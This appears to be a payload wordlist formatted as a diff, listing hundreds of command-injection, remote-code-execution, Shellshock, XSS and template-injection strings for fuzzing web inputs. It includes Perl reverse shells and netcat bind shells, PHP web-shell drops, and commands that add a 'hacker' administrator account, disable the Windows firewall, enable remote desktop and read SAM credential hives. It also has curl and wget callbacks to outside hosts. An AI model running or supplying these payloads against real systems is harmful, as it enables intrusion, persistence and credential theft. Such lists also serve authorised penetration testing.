+ curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+dir
+| dir
+; dir
+$(`dir`)
+& dir
+&&dir
+&& dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+dir C:\
+| dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+dir C:\Documents and Settings\*
+| dir C:\Users
+; dir C:\Users
+& dir C:\Users
+&& dir C:\Users
+dir C:\Users
+;echo%20'<script>alert(1)</script>'
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+;echo '<script>alert(1)</script>'
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+() { :;}; echo vulnerable 10
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+;{$_GET["cmd"]}
+`id`
+|id
+| id
+;id
+;id|
+;id;
+& id
+&&id
+;id\n
+ifconfig
+| ifconfig
+; ifconfig
+& ifconfig
+&& ifconfig
+/index.html|id|
+ipconfig
+| ipconfig /all
+; ipconfig /all
+& ipconfig /all
+&& ipconfig /all
+ipconfig /all
+ls
+$(`ls`)
+| ls -l /
+; ls -l /
+& ls -l /
+&& ls -l /
+ls -l /
+| ls -laR /etc
+; ls -laR /etc
+& ls -laR /etc
+&& ls -laR /etc
+| ls -laR /var/www
+; ls -laR /var/www
+& ls -laR /var/www
+&& ls -laR /var/www
+| ls -l /etc/
+; ls -l /etc/
+& ls -l /etc/
+&& ls -l /etc/
+ls -l /etc/
+ls -lh /etc/
+| ls -l /home/*
+; ls -l /home/*
+& ls -l /home/*
+&& ls -l /home/*
+ls -l /home/*
+*; ls -lhtR /var/www/
+| ls -l /tmp
+; ls -l /tmp
+& ls -l /tmp
+&& ls -l /tmp
+ls -l /tmp
+| ls -l /var/www/*
+; ls -l /var/www/*
+& ls -l /var/www/*
+&& ls -l /var/www/*
+ls -l /var/www/*
+\n
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\n/bin/ls -al\n
+| nc -lvvp 4444 -e /bin/sh|
+; nc -lvvp 4444 -e /bin/sh;
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+| net localgroup Administrators hacker /ADD
+; net localgroup Administrators hacker /ADD
+& net localgroup Administrators hacker /ADD
+&& net localgroup Administrators hacker /ADD
+net localgroup Administrators hacker /ADD
+| netsh firewall set opmode disable
+; netsh firewall set opmode disable
+& netsh firewall set opmode disable
+&& netsh firewall set opmode disable
+netsh firewall set opmode disable
+netstat
+;netstat -a;
+| netstat -an
+; netstat -an
+& netstat -an
+&& netstat -an
+netstat -an
+| net user hacker Password1 /ADD
+; net user hacker Password1 /ADD
+& net user hacker Password1 /ADD
+&& net user hacker Password1 /ADD
+net user hacker Password1 /ADD
+| net view
+; net view
+& net view
+&& net view
+net view
+\nid|
+\nid;
+\nid\n
+\n/usr/bin/id\n
+perl -e 'print "X"x1024'
+|| perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+perl -e 'print "X"x16384'
+; perl -e 'print "X"x2048'
+& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x2048'
+perl -e 'print "X"x2048'
+|| perl -e 'print "X"x4096'
+| perl -e 'print "X"x4096'
+; perl -e 'print "X"x4096'
+& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x4096'
+perl -e 'print "X"x4096'
+|| perl -e 'print "X"x8096'
+| perl -e 'print "X"x8096'
+; perl -e 'print "X"x8096'
+&& perl -e 'print "X"x8096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+|| phpinfo()
+| phpinfo()
+ {${phpinfo()}}
+;phpinfo()
+;phpinfo();//
+';phpinfo();//
+{${phpinfo()}}
+& phpinfo()
+&& phpinfo()
+phpinfo()
+phpinfo();
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
+<?php system("sleep 10");?>
+<?php system("sleep 5");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+:phpversion();
+`ping 127.0.0.1`
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+;${@print(md5(RCEVulnerable))};
+${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+pwd
+| pwd
+; pwd
+& pwd
+&& pwd
+\r
+| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+\r\n
+route
+| sleep 1
+; sleep 1
+& sleep 1
+&& sleep 1
+sleep 1
+|| sleep 10
+| sleep 10
+; sleep 10
+{${sleep(10)}}
+& sleep 10 
+&& sleep 10
+sleep 10
+|| sleep 15
+| sleep 15
+; sleep 15
+& sleep 15 
+&& sleep 15
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+| sleep 5
+; sleep 5
+& sleep 5
+&& sleep 5
+sleep 5
+ {${sleep(hexdec(dechex(20)))}} 
+{${sleep(hexdec(dechex(20)))}} 
+sysinfo
+| sysinfo
+; sysinfo
+& sysinfo
+&& sysinfo
+system('cat C:\boot.ini');
+system('cat config.php');
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+system('curl https://crowdshield.com/.testing/rce_vuln.txt')
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+systeminfo
+| systeminfo
+; systeminfo
+& systeminfo
+&& systeminfo
+system('ls')
+system('pwd')
+system('pwd');
+|| system('sleep 5');
+| system('sleep 5');
+; system('sleep 5');
+& system('sleep 5');
+&& system('sleep 5');
+system('sleep 5')
+system('sleep 5');
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+system('whoami')
+system('whoami');
+test*; ls -lhtR /var/www/
+test* || perl -e 'print "X"x16096'
+test* | perl -e 'print "X"x16096'
+test* & perl -e 'print "X"x16096'
+test* && perl -e 'print "X"x16096'
+test*; perl -e 'print "X"x16096'
+$(`type C:\boot.ini`)
+&&type C:\\boot.ini
+| type C:\Windows\repair\SAM
+; type C:\Windows\repair\SAM
+& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SAM
+type C:\Windows\repair\SAM
+| type C:\Windows\repair\SYSTEM
+; type C:\Windows\repair\SYSTEM
+& type C:\Windows\repair\SYSTEM
+&& type C:\Windows\repair\SYSTEM
+type C:\Windows\repair\SYSTEM
+| type C:\WINNT\repair\SAM
+; type C:\WINNT\repair\SAM
+& type C:\WINNT\repair\SAM
+&& type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+| type %SYSTEMROOT%\repair\SAM
+; type %SYSTEMROOT%\repair\SAM
+& type %SYSTEMROOT%\repair\SAM
+&& type %SYSTEMROOT%\repair\SAM
+type %SYSTEMROOT%\repair\SAM
+| type %SYSTEMROOT%\repair\SYSTEM
+; type %SYSTEMROOT%\repair\SYSTEM
+& type %SYSTEMROOT%\repair\SYSTEM
+&& type %SYSTEMROOT%\repair\SYSTEM
+type %SYSTEMROOT%\repair\SYSTEM
+uname
+;uname;
+| uname -a
+; uname -a
+& uname -a
+&& uname -a
+uname -a
+|/usr/bin/id
+;|/usr/bin/id|
+;/usr/bin/id|
+$;/usr/bin/id
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+| wget http://crowdshield.com/.testing/rce.txt
+& wget http://crowdshield.com/.testing/rce.txt
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+wget https://crowdshield.com/.testing/rce_vuln.txt
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+whoami
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+somedir \x1a whoami
+\! whoami
+word " c:\\where\\ || dir || '
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
